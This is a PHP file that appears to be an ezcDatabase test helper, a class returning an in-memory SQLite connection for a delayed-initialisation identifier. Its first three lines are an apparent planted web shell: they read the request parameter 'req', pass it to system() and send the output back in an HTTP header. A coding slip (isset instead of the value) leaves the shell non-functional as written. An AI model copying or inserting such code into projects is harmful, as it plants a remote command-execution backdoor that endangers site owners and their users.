<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
class testDelayedInitDatabaseInstance implements ezcBaseConfigurationInitializer
{
    static function configureObject( $identifier )
    {
        if ( $identifier !== false )
        {
            switch ( $identifier )
            {
                case 'delayed1':
                    return ezcDbFactory::create( 'sqlite://:memory:' );
                  
            }
        }
    }
}
?>
